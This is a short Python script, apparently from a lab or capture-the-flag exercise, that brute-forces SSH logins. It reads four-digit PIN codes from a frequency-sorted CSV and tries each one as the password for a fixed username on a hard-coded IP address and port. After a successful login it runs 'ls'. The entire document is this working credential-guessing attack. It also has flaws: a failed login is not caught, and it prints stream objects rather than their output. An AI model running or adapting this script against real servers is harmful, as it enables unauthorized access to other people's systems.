import os
import csv
import paramiko

pinscsv = "four-digit-pin-codes-sorted-by-frequency-withcount.csv"

with open(pinscsv, 'r') as pins:
  pinsreader = csv.reader(pins)
  for row in pinsreader:
    pin = row[0]
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("165.232.143.187", port=8203, username="u39724", password=pin)
    stdin, stdout, stderr=ssh.exec_command('ls')
    print(stdin, stdout, stderr)
